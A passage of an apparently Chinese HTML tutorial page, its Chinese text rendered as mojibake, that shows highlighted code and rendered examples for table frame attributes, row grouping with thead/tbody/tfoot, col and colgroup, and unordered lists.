id="æ¡†æ¶"><a href="#æ¡†æ¶" class="headerlink" title="æ¡†æ¶"></a>æ¡†æ¶</h3><p><code>frame</code>å±æ€§</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>Table with frame="box":<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">frame</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>box<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>Month<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>Savings<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>January<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>$100<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>Table with frame="above":<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">frame</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>above<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>Month<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>Savings<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>January<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>$100<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>Table with frame="below":<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">frame</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>below<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>Month<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>Savings<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>January<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>$100<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>Table with frame="hsides":<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">frame</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hsides<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>Month<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>Savings<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>January<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>$100<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>Table with frame="vsides":<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">frame</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>vsides<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>Month<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>Savings<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>January<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>$100<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">&gt;</span></span></code></pre><p>Table with frame="box":</p><table frame="box">  <tbody><tr>    <th>Month</th>    <th>Savings</th>  </tr>  <tr>    <td>January</td>    <td>$100</td>  </tr></tbody></table><p>Table with frame="above":</p><table frame="above">  <tbody><tr>    <th>Month</th>    <th>Savings</th>  </tr>  <tr>    <td>January</td>    <td>$100</td>  </tr></tbody></table><p>Table with frame="below":</p><table frame="below">  <tbody><tr>    <th>Month</th>    <th>Savings</th>  </tr>  <tr>    <td>January</td>    <td>$100</td>  </tr></tbody></table><p>Table with frame="hsides":</p><table frame="hsides">  <tbody><tr>    <th>Month</th>    <th>Savings</th>  </tr>  <tr>    <td>January</td>    <td>$100</td>  </tr></tbody></table><p>Table with frame="vsides":</p><table frame="vsides">  <tbody><tr>    <th>Month</th>    <th>Savings</th>  </tr>  <tr>    <td>January</td>    <td>$100</td>  </tr></tbody></table><h3 id="è¡Œåˆ†ç»„"><a href="#è¡Œåˆ†ç»„" class="headerlink" title="è¡Œåˆ†ç»„"></a>è¡Œåˆ†ç»„</h3><p><code>thead</code> å…ƒç´ åº”è¯¥ä¸ <code>tbody</code> å’Œ <code>tfoot</code> å…ƒç´ ç»“åˆèµ·æ¥ä½¿ç”¨ã€‚ï¼ˆä½†å¾ˆå°‘ä½¿ç”¨è¿™ä¸‰ä¸ªå…ƒç´ ï¼‰</p><p><code>tbody</code> å…ƒç´ ç”¨äºå¯¹ HTML è¡¨æ ¼ä¸­çš„ä¸»ä½“å†…å®¹è¿›è¡Œåˆ†ç»„ï¼Œè€Œ <code>tfoot</code> å…ƒç´ ç”¨äºå¯¹ HTML è¡¨æ ¼ä¸­çš„è¡¨æ³¨ï¼ˆé¡µè„šï¼‰å†…å®¹è¿›è¡Œåˆ†ç»„ã€‚</p><blockquote><p>theadã€tfoot ä»¥åŠ tbody  å…ƒç´ ä½¿æ‚¨æœ‰èƒ½åŠ›å¯¹è¡¨æ ¼ä¸­çš„è¡Œè¿›è¡Œåˆ†ç»„ã€‚å½“æ‚¨åˆ›å»ºæŸä¸ªè¡¨æ ¼æ—¶ï¼Œæ‚¨ä¹Ÿè®¸å¸Œæœ›æ‹¥æœ‰ä¸€ä¸ªæ ‡é¢˜è¡Œï¼Œä¸€äº›å¸¦æœ‰æ•°æ®çš„è¡Œï¼Œä»¥åŠä½äºåº•éƒ¨çš„ä¸€ä¸ªæ€»è®¡è¡Œã€‚è¿™ç§åˆ’åˆ†ä½¿æµè§ˆå™¨æœ‰èƒ½åŠ›æ”¯æŒç‹¬ç«‹äºè¡¨æ ¼æ ‡é¢˜å’Œé¡µè„šçš„è¡¨æ ¼æ­£æ–‡æ»šåŠ¨ã€‚å½“é•¿çš„è¡¨æ ¼è¢«æ‰“å°æ—¶ï¼Œè¡¨æ ¼çš„è¡¨å¤´å’Œé¡µè„šå¯è¢«æ‰“å°åœ¨åŒ…å«è¡¨æ ¼æ•°æ®çš„æ¯å¼ é¡µé¢ä¸Šã€‚</p></blockquote><p><code>&lt;thead&gt;</code> å†…éƒ¨å¿…é¡»æ‹¥æœ‰<code> &lt;tr&gt;</code> æ ‡ç­¾ï¼</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>thead</span> <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">color</span><span class="token punctuation">:</span>green</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>Month<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>Savings<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>thead</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tbody</span> <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">color</span><span class="token punctuation">:</span>blue<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span>50px</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>January<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>$100<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>February<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>$80<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tbody</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tfoot</span> <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">color</span><span class="token punctuation">:</span>red</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>Sum<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>$180<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tfoot</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">&gt;</span></span></code></pre><table border="1">  <thead style="color:green">    <tr>      <th>Month</th>      <th>Savings</th>    </tr>  </thead>  <tbody style="color:blue;height:50px">    <tr>      <td>January</td>      <td>$100</td>    </tr>    <tr>      <td>February</td>      <td>$80</td>    </tr>  </tbody>  <tfoot style="color:red">    <tr>      <td>Sum</td>      <td>$180</td>    </tr>  </tfoot></table><h3 id="åˆ—åˆ†ç»„"><a href="#åˆ—åˆ†ç»„" class="headerlink" title="åˆ—åˆ†ç»„"></a>åˆ—åˆ†ç»„</h3><p><code>col</code>æ ‡ç­¾ä¸ºè¡¨æ ¼ä¸­ä¸€ä¸ªæˆ–å¤šä¸ªåˆ—å®šä¹‰å±æ€§å€¼ã€‚</p><p><code>col</code> å…ƒç´ æ˜¯ä»…åŒ…å«å±æ€§çš„ç©ºå…ƒç´ ã€‚å¦‚éœ€åˆ›å»ºåˆ—ï¼Œæ‚¨å°±å¿…é¡»åœ¨ <code>tr</code> å…ƒç´ å†…éƒ¨è§„å®š <code>td</code> å…ƒç´ ã€‚</p><p>ä¾‹å¦‚ä¸ºè¡¨æ ¼ä¸­çš„ä¸‰ä¸ªåˆ—è§„å®šäº†ä¸åŒçš„å¯¹é½æ–¹å¼ï¼š</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100%<span class="token punctuation">"</span></span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>col</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>left<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>col</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>left<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>col</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>right<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>ISBN<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>Title<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>Price<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>3476896<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>My first HTML<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>$53<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">&gt;</span></span></code></pre><table width="100%" border="1">  <colgroup><col align="left">  <col align="left">  <col align="right">  </colgroup><tbody><tr>    <th>ISBN</th>    <th>Title</th>    <th>Price</th>  </tr>  <tr>    <td>3476896</td>    <td>My first HTML</td>    <td>$53</td>  </tr></tbody></table><p><em>ï¼ˆç„¶è€Œæˆ‘ç”¨Firefoxã€Chromeã€Edgeéƒ½æ²¡æœ‰æ•ˆæœemmmmã€‚</em></p><hr><p><code>colgroup</code> æ ‡ç­¾ç”¨äºå¯¹è¡¨æ ¼ä¸­çš„åˆ—è¿›è¡Œç»„åˆï¼Œä»¥ä¾¿å¯¹å…¶è¿›è¡Œæ ¼å¼åŒ–ã€‚</p><p>å¦‚éœ€å¯¹å…¨éƒ¨åˆ—åº”ç”¨æ ·å¼ï¼Œ<code>&lt;colgroup&gt;</code>æ ‡ç­¾å¾ˆæœ‰ç”¨ï¼Œè¿™æ ·å°±ä¸éœ€è¦å¯¹å„ä¸ªå•å…ƒå’Œå„è¡Œé‡å¤åº”ç”¨æ ·å¼äº†ã€‚</p><p><code>&lt;colgroup&gt;</code> æ ‡ç­¾åªèƒ½åœ¨ <code>table</code> å…ƒç´ ä¸­ä½¿ç”¨ã€‚</p><p>ä¾‹å¦‚ä¸¤ä¸ª colgroup å…ƒç´ ä¸ºè¡¨æ ¼ä¸­çš„ä¸‰åˆ—è§„å®šäº†ä¸åŒçš„å¯¹é½æ–¹å¼å’Œæ ·å¼ï¼ˆæ³¨æ„ç¬¬ä¸€ä¸ª colgroup å…ƒç´ æ¨ªè·¨ä¸¤åˆ—ï¼‰ï¼š</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100%<span class="token punctuation">"</span></span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>colgroup</span> <span class="token attr-name">span</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>left<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>colgroup</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>colgroup</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>right<span class="token punctuation">"</span></span> <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">color</span><span class="token punctuation">:</span>#0000FF<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>colgroup</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>ISBN<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>Title<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>Price<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>3476896<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>My first HTML<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>$53<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">&gt;</span></span></code></pre><table width="100%" border="1">  <colgroup span="2" align="left"></colgroup>  <colgroup align="right" style="color:#0000FF;"></colgroup>  <tbody><tr>    <th>ISBN</th>    <th>Title</th>    <th>Price</th>  </tr>  <tr>    <td>3476896</td>    <td>My first HTML</td>    <td>$53</td>  </tr></tbody></table><p><em>ï¼ˆç„¶è€Œæˆ‘è¿™é‡Œè¿˜æ˜¯æ²¡æœ‰æ•ˆæœemmm</em></p><br><h2 id="åˆ—è¡¨"><a href="#åˆ—è¡¨" class="headerlink" title="åˆ—è¡¨"></a>åˆ—è¡¨</h2><h3 id="æ— åºåˆ—è¡¨"><a href="#æ— åºåˆ—è¡¨" class="headerlink" title="æ— åºåˆ—è¡¨"></a>æ— åºåˆ—è¡¨</h3><p><strong>Unordered list</strong></p><p><strong><em>ï¼ˆè¿™é‡Œçš„æ ·å¼ä¹Ÿè¢«å…¨å±€çš„æ ·å¼ç»™å†²æ‰äº† emmm</em></strong></p><p>é¡¹ç›®åˆ—è¡¨ï¼Œé¡¹ç›®é»˜è®¤ä½¿ç”¨ç²—ä½“åœ†ç‚¹ï¼ˆå…¸å‹çš„å°é»‘åœ†åœˆï¼‰è¿›è¡Œæ ‡è®°ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>First item<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>Next item<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">&gt;</span></span></code></pre><ul>    <li>First item</li>    <li>Next item</li></ul><p>å¯ä»¥å®šä¹‰ä¸åŒçš„æ ·å¼ç±»å‹ã€‚</p><h4 id="disc-ç±»å‹"><a href="#disc-ç±»å‹" class="headerlink" title="disc ç±»å‹"></a>disc ç±»å‹</h4><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>disc<span class="token 